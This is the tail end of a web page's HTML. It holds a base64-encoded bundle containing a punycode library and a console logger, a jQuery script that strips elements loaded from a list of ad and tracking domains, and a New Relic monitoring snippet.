hvLHQpLmpvaW4oIi4iKTtyZXR1cm4gcithfWZ1bmN0aW9uIGMoZSl7Zm9yKHZhciB0LG4scj1bXSxvPTAsaT1lLmxlbmd0aDtvPGk7KXQ9ZS5jaGFyQ29kZUF0KG8rKyksdD49NTUyOTYmJnQ8PTU2MzE5JiZvPGk/KG49ZS5jaGFyQ29kZUF0KG8rKyksNTYzMjA9PSg2NDUxMiZuKT9yLnB1c2goKCgxMDIzJnQpPDwxMCkrKDEwMjMmbikrNjU1MzYpOihyLnB1c2godCksby0tKSk6ci5wdXNoKHQpO3JldHVybiByfWZ1bmN0aW9uIHUoZSl7cmV0dXJuIGkoZSxmdW5jdGlvbihlKXt2YXIgdD0iIjtyZXR1cm4gZT42NTUzNSYmKGUtPTY1NTM2LHQrPUgoZT4+PjEwJjEwMjN8NTUyOTYpLGU9NTYzMjB8MTAyMyZlKSx0Kz1IKGUpfSkuam9pbigiIil9ZnVuY3Rpb24gcyhlKXtyZXR1cm4gZS00ODwxMD9lLTIyOmUtNjU8MjY/ZS02NTplLTk3PDI2P2UtOTc6RX1mdW5jdGlvbiBsKGUsdCl7cmV0dXJuIGUrMjIrNzUqKGU8MjYpLSgoMCE9dCk8PDUpfWZ1bmN0aW9uIGQoZSx0LG4pe3ZhciByPTA7Zm9yKGU9bj9rKGUvUik6ZT4+MSxlKz1rKGUvdCk7ZT5OKk8+PjE7cis9RSllPWsoZS9OKTtyZXR1cm4gayhyKyhOKzEpKmUvKGUrVCkpfWZ1bmN0aW9uIGYoZSl7dmFyIHQsbixyLGksYSxjLGwsZixwLGgsZz1bXSx3PWUubGVuZ3RoLHY9MCxfPUEsYj1DO2ZvcihuPWUubGFzdEluZGV4T2YoUCksbjwwJiYobj0wKSxyPTA7cjxuOysrcillLmNoYXJDb2RlQXQocik+PTEyOCYmbygibm90LWJhc2ljIiksZy5wdXNoKGUuY2hhckNvZGVBdChyKSk7Zm9yKGk9bj4wP24rMTowO2k8dzspe2ZvcihhPXYsYz0xLGw9RTtpPj13JiZvKCJpbnZhbGlkLWlucHV0IiksZj1zKGUuY2hhckNvZGVBdChpKyspKSwoZj49RXx8Zj5rKCh5LXYpL2MpKSYmbygib3ZlcmZsb3ciKSx2Kz1mKmMscD1sPD1iP1M6bD49YitPP086bC1iLCEoZjxwKTtsKz1FKWg9RS1wLGM+ayh5L2gpJiZvKCJvdmVyZmxvdyIpLGMqPWg7dD1nLmxlbmd0aCsxLGI9ZCh2LWEsdCwwPT1hKSxrKHYvdCk+eS1fJiZvKCJvdmVyZmxvdyIpLF8rPWsodi90KSx2JT10LGcuc3BsaWNlKHYrKywwLF8pfXJldHVybiB1KGcpfWZ1bmN0aW9uIHAoZSl7dmFyIHQsbixyLGksYSx1LHMsZixwLGgsZyx3LHYsXyxiLG09W107Zm9yKGU9YyhlKSx3PWUubGVuZ3RoLHQ9QSxuPTAsYT1DLHU9MDt1PHc7Kyt1KWc9ZVt1XSxnPDEyOCYmbS5wdXNoKEgoZykpO2ZvcihyPWk9bS5sZW5ndGgsaSYmbS5wdXNoKFApO3I8dzspe2ZvcihzPXksdT0wO3U8dzsrK3UpZz1lW3VdLGc+PXQmJmc8cyYmKHM9Zyk7Zm9yKHY9cisxLHMtdD5rKCh5LW4pL3YpJiZvKCJvdmVyZmxvdyIpLG4rPShzLXQpKnYsdD1zLHU9MDt1PHc7Kyt1KWlmKGc9ZVt1XSxnPHQmJisrbj55JiZvKCJvdmVyZmxvdyIpLGc9PXQpe2ZvcihmPW4scD1FO2g9cDw9YT9TOnA+PWErTz9POnAtYSwhKGY8aCk7cCs9RSliPWYtaCxfPUUtaCxtLnB1c2goSChsKGgrYiVfLDApKSksZj1rKGIvXyk7bS5wdXNoKEgobChmLDApKSksYT1kKG4sdixyPT1pKSxuPTAsKytyfSsrbiwrK3R9cmV0dXJuIG0uam9pbigiIil9ZnVuY3Rpb24gaChlKXtyZXR1cm4gYShlLGZ1bmN0aW9uKGUpe3JldHVybiBMLnRlc3QoZSk/ZihlLnNsaWNlKDQpLnRvTG93ZXJDYXNlKCkpOmV9KX1mdW5jdGlvbiBnKGUpe3JldHVybiBhKGUsZnVuY3Rpb24oZSl7cmV0dXJuIEkudGVzdChlKT8ieG4tLSIrcChlKTplfSl9dmFyIHc9Im9iamVjdCI9PXR5cGVvZiBuJiZuJiYhbi5ub2RlVHlwZSYmbix2PSJvYmplY3QiPT10eXBlb2YgdCYmdCYmIXQubm9kZVR5cGUmJnQsXz0ib2JqZWN0Ij09dHlwZW9mIGUmJmU7Xy5nbG9iYWwhPT1fJiZfLndpbmRvdyE9PV8mJl8uc2VsZiE9PV98fChyPV8pO3ZhciBiLG0seT0yMTQ3NDgzNjQ3LEU9MzYsUz0xLE89MjYsVD0zOCxSPTcwMCxDPTcyLEE9MTI4LFA9Ii0iLEw9L154bi0tLyxJPS9bXlx4MjAtXHg3RV0vLHg9L1tceDJFXHUzMDAyXHVGRjBFXHVGRjYxXS9nLGo9e292ZXJmbG93OiJPdmVyZmxvdzogaW5wdXQgbmVlZHMgd2lkZXIgaW50ZWdlcnMgdG8gcHJvY2VzcyIsIm5vdC1iYXNpYyI6IklsbGVnYWwgaW5wdXQgPj0gMHg4MCAobm90IGEgYmFzaWMgY29kZSBwb2ludCkiLCJpbnZhbGlkLWlucHV0IjoiSW52YWxpZCBpbnB1dCJ9LE49RS1TLGs9TWF0aC5mbG9vcixIPVN0cmluZy5mcm9tQ2hhckNvZGU7aWYoYj17dmVyc2lvbjoiMS40LjEiLHVjczI6e2RlY29kZTpjLGVuY29kZTp1fSxkZWNvZGU6ZixlbmNvZGU6cCx0b0FTQ0lJOmcsdG9Vbmljb2RlOmh9LCJmdW5jdGlvbiI9PXR5cGVvZiBkZWZpbmUmJiJvYmplY3QiPT10eXBlb2YgZGVmaW5lLmFtZCYmZGVmaW5lLmFtZClkZWZpbmUoInB1bnljb2RlIixmdW5jdGlvbigpe3JldHVybiBifSk7ZWxzZSBpZih3JiZ2KWlmKHQuZXhwb3J0cz09dyl2LmV4cG9ydHM9YjtlbHNlIGZvcihtIGluIGIpYi5oYXNPd25Qcm9wZXJ0eShtKSYmKHdbbV09YlttXSk7ZWxzZSByLnB1bnljb2RlPWJ9KHRoaXMpfSkuY2FsbCh0aGlzLCJ1bmRlZmluZWQiIT10eXBlb2YgZ2xvYmFsP2dsb2JhbDoidW5kZWZpbmVkIiE9dHlwZW9mIHNlbGY/c2VsZjoidW5kZWZpbmVkIiE9dHlwZW9mIHdpbmRvdz93aW5kb3c6e30pfSx7fV0sMjY6W2Z1bmN0aW9uKGUsdCxuKXtmdW5jdGlvbiByKGUsdCl7Y29uc3Qgbj1hW3RdO3ZvaWQgMCE9PW4mJihuPjAmJihlLmFzc2VydD1mdW5jdGlvbigpe30pLG4+NSYmKGUudHJhY2U9ZnVuY3Rpb24oKXt9KSxuPjEwJiYoZS5kZWJ1Zz1mdW5jdGlvbigpe30pLG4+MjAmJihlLmxvZz1mdW5jdGlvbigpe30pLG4+MzAmJihlLmluZm89ZnVuY3Rpb24oKXt9KSxuPjQwJiYoZS53YXJuPWZ1bmN0aW9uKCl7fSksbj41MCYmKGUuZXJyb3I9ZnVuY3Rpb24oKXt9KSl9ZnVuY3Rpb24gbyhlLHQpe3Q9dHx8e307Y29uc3Qgbj10LmxldmVsfHwiZGVidWciO3IoZSxuKX1mdW5jdGlvbiBpKGUpe2NvbnN0IHQ9T2JqZWN0LmNyZWF0ZShjb25zb2xlKTtyZXR1cm4gbyh0LGUpLHR9Y29uc3QgYT17YWxsOjAsdHJhY2U6NSxkZWJ1ZzoxMCxsb2c6MjAsaW5mbzozMCx3YXJuOjQwLGVycm9yOjUwfSxjPWkoKTt0LmV4cG9ydHM9e2xvZ2dlcjpjLGNvbmZpZ3VyZTpvLGNyZWF0ZTppfX0se31dfSx7fSxbMV0pOw=="));</script>
<script async>
$(document).ready(function () {
    var iframe_src='',iframe_id='',iframe_title='',iframe_name='',img_src1='',script_src='',object_src='',div_class='',div_id='',form_id='',a_id='',iframe_flag=0,script_flag=0,img_flag=0;
    var dirtyArr=[
    "33across.com",
    "d3r68oj92b.com",
    "adap.tv",
    "advertising.com",
    "amazon",
    "adform.net",
    "adsafeprotected.com",
    "acuityplatform.com",
    "adsrvr.org",
    "ad-m.asia",
    "ad-score.com",
    "adrta.com",
    "bluekai.com",
    "beginads.com",
    "bidtheatre.com",
    "b2c.com",
    "crwdcntrl.net",
    "cmbestsrv.com",
    "criteo.com",
    "criteo.net",
    "cpx.to",
    "contextweb.com",
    "doubleverify.com",
    "dotomi.com",
    "exelator.com",
    "everesttech.com",
    "eqads.com",
    "erne.co",
    "fqtag.com",
    "gwallet.com",
    "groupon.com",
    "imrworldwide.com",
    "intentiq.com",
    "linkstorm.net",
    "lkqd.net",
    "moatads.com",
    "mathtag.com",
    "media6degrees.com",
    "mythings.com",
    "mxptint.net",
    "mediapostcommunication.net",
    "netseer.com",
    "netmng.com",
    "openx",
    "owneriq.net",
    "pfrm.co",
    "quantserve.com",
    "rubiconproject.com",
    "reactrmod.com",
    "rfihub.com",
    "revjet.com",
    "smartadserver.com",
    "sddan.com",
    "sitescout.com",
    "streamrail.com",
    "skimresources.com",
    "spotad.co",
    "simpli.fi",
    "sonobi.com",
    "sekindo.com",
    "tapad.com",
    "turn.com",
    "tidaltv.com",
    "tynt.com",
    "trustarc.com",
    "videoamp.com",
    "vidible.tv",
    "visiblemeasures.com",
    "visualdna.com",
    "vindicosuite.com",
    "walmart",
    "w55c.net",
    "yimg.com",
    "javascript:"
    ];
    var dirtyArrCnt=dirtyArr.length;
    setInterval(function() {
        $("iframe").each(function() {
            iframe_flag=0;
            iframe_src= $(this).attr('src'),iframe_id=$(this).attr('id'),iframe_title=$(this).attr('title'),iframe_name=$(this).attr('name');
            if(iframe_id==undefined){iframe_id='akp';}if(iframe_title==undefined){iframe_title='akp';}
            if(iframe_src!=undefined){
                for(var i=0;i<dirtyArrCnt;i++){
                    if(iframe_src.indexOf(dirtyArr[i])!=-1){
                        iframe_flag=1;$(this).remove();break;
                    }else{
                        if(iframe_name=="hpif"||iframe_name=="script_leader"||(iframe_src.indexOf("about:blank")>=0&&iframe_title.indexOf("Advertisement")==-1&&iframe_id.indexOf("insticator")==-1&&iframe_id.indexOf("google")==-1&&iframe_id.indexOf("taboola")==-1)){
                            iframe_flag=1;$(this).remove();break;
                        }
                    }
                }
                if(iframe_flag==1){
                        
                }
                
            }
        });
        $("img").each(function() {
            img_flag=0;
            img_src1= $(this).attr('src');
            if(img_src1!=undefined){
                for(var i=0;i<dirtyArrCnt;i++){
                    if(img_src1.indexOf(dirtyArr[i])!=-1){
                        img_flag=1;$(this).remove();break;
                    }
                }
                if(img_flag==1){
                        
                }
            }
        });
        $("script").each(function() {
            script_flag=0;
            script_src= $(this).attr('src');
            if(script_src!=undefined){
                for(var i=0;i<dirtyArrCnt;i++){
                    if(script_src.indexOf(dirtyArr[i])!=-1){
                        script_flag=1;$(this).remove();break;
                    }
                }
                if(script_flag==1){
                        
                }
            }
        });
        $("div").each(function() {
            div_id= $(this).attr('id');div_class= $(this).attr('class');
            if((div_id!=undefined&&(div_id.indexOf("gemini")>=0))||(div_class!=undefined&&(div_class.indexOf("gemini")>=0||div_class.indexOf("lydianint")>=0))){$(this).remove();
                            }
        });
        $("a").each(function() {
            a_id= $(this).attr('href');
            if(a_id!=undefined&&(a_id.indexOf("doubleclick.net")>=0)){$(this).remove();
                            }
        });
        /*$("form").each(function() {
            form_id= $(this).attr('id');
            if(form_id!=undefined&&(form_id.indexOf("form-")>=0)){$(this).remove();
                            }
        });*/
            }, 1000);
    var dirtyAd=setInterval(function(){
        $("iframe[id^=15212]").remove();
        $("iframe[id^='0.']").remove();
        $("html").removeClass("gr__allkpop_com");}, 500);
        setTimeout(function(){clearInterval(dirtyAd);},8000);
    });
</script>
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"e6cb271da4","applicationID":"1679402","transactionName":"NlZSYhNSDEMAUBALWQ8cZUQIHAteBVYcTEYJQw==","queueTime":0,"applicationTime":13,"atts":"GhFRFFtIH00=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
</html>